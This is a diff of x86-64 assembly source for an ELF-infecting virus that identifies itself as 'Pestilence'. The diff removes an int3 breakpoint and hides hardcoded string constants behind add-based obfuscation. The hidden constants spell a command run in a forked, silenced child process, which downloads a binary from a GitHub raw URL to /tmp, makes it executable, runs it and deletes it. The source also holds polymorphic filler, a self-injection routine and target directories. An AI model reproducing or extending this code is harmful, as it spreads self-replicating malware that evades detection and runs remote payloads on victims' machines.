@@ -4,7 +4,6 @@ SECTION .TEXT EXEC WRITE
 global  _start                              ;must be declared for linker (ld)
 
 _start:   ;Entry-Point
-int3
 OBF_GENERIC
 PUSH
 OBF_GENERIC
@@ -291,7 +290,6 @@ DECYPHER
 
 ;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
 .durex:
-
 ;FORK THE DUREX PROCESS !
 	mov rax, _fork
 	syscall
@@ -299,15 +297,13 @@ DECYPHER
 	jne .skip_durex
 
 
-	;CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
+;	CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
 	mov rax, _close
 	mov rdi, 1
 	syscall
 	mov rax, _close
 	mov rdi, 2
 	syscall
-
-
 
 	lea rdi, STACK(famine.status_str)
 	lea rsi, STACK(famine.commpath)
@@ -335,39 +331,73 @@ DECYPHER
 	mov byte[rax], r10b
 	inc rax
 
-	mov r10, 0x2f2f3a7370747468
+	mov r10, 0x1FE9D6214E305123
+	mov r11, 0xF45645222442345
+	add r10, r11
 	mov qword[rax], r10
-	mov r10, 0x632e627568746967
+	mov r10, 0x627F71E4CF734788
+	mov r11, 0xAEF090990121DF
+	add r10, r11
 	mov qword[rax+8], r10
-	mov r10, 0x756f6172612f6d6f
+	mov r10, 0x1338087384BA29D6
+	mov r11, 0x623758FEDC754399
+	add r10, r11
 	mov qword[rax+16], r10
-	mov r10, 0x756465722f323474
+	mov r10, 0x657480C882200252
+	mov r11, 0xFEFE4A9AD123222
+	add r10, r11
 	mov qword[rax+24], r10
-	mov r10, 0x6d2f626f6c622f78
+	mov r10, 0x58F9FA9117B35E00
+	mov r11, 0x143567DE54AED178
+	add r10, r11
 	mov qword[rax+32], r10
-	mov r10, 0x75442f7265747361
+	mov r10, 0x651A41E5BDEFB23E
+	mov r11, 0x1029ED8CA784C123
+	add r10, r11
 	mov qword[rax+40], r10
-	mov r10, 0x3d7761723f786572
+	mov r10, 0x1BAAB6F9EB6664A5
+	mov r11, 0x21CCAA78541200CD
+	add r10, r11
 	mov qword[rax+48], r10
-	mov r10, 0x2d20657572743d77
+	mov r10, 0x24167B8C5FA63D78
+	mov r11, 0x0909E9E912CDFFFF
+	add r10, r11
 	mov qword[rax+54], r10
-	mov r10, 0x742f706d742f204f
+	mov r10, 0x5F5C631E0F3E
+	mov r11, 0x742F111111111111
+	add r10, r11
 	mov qword[rax+62], r10
-	mov r10, 0x74656975712d2d20
+	mov r10, 0x20527BA8C39CA60E
+	mov r11, 0x5412EDCCAD908712
+	add r10, r11
 	mov qword[rax+70], r10
-	mov r10, 0x7665642f206f2d20
+	mov r10, 0x425B84450C07D917
+	mov r11, 0x3409DFEA14675409
+	add r10, r11
 	mov qword[rax+78], r10
-	mov r10, 0x2020206c6c756e2f
+	mov r10, 0xEBAA7DC5A415D1E
+	mov r11, 0x1165789012341111
+	add r10, r11
 	mov qword[rax+86], r10
-	mov r10, 0x6f6d686320262620
+	mov r10, 0x1A0A262C437B24DB
+	mov r11, 0x55634236DCAB0145
+	add r10, r11
 	mov qword[rax+94], r10
-	mov r10, 0x742f203737372064
+	mov r10, 0x73FCDA4A89A6B921
+	mov r11, 0x3245ECAD906743
+	add r10, r11
 	mov qword[rax+102], r10,
-	mov r10, 0x20262620742f706d
+	mov r10, 0xEE0591FED833C10
+	mov r11, 0x1145CD0086AC345D
+	add r10, r11
 	mov qword[rax+110], r10
-	mov r10, 0x723b742f706d742f
+	mov r10, 0x1CB03BEFFFD03BF
+	mov r11, 0x7070707070707070
+	add r10, r11
 	mov qword[rax+118], r10
-	mov r10, 0x742f706d742f206d
+	mov r10, 0x55522D191E1C52C0
+	mov r11, 0x1EDD43545612CDAD
+	add r10, r11
 	mov qword[rax+126], r10
 	mov qword[rsi+24], 0x0
 	mov rdx, 0
@@ -538,7 +568,7 @@ check_elf64:
 inject_self:
 	push r13		; save registers in case we need to restore 
 	OBF_OVERWRITE_PUSHR14R15
-	
+
 	OBF_GENERIC2
 	jmp .after_poly_crap_skipped
 	POLY_CRAP_SKIPPED
@@ -795,7 +825,7 @@ infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
 	db 0
 signature		db			0x00, 'Pestilence version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
-forbidden		db			"Durex", 0
+forbidden		db			"test.out", 0
 famine_entry	dq			_start
 random			db			"/dev/urandom",0,0
 
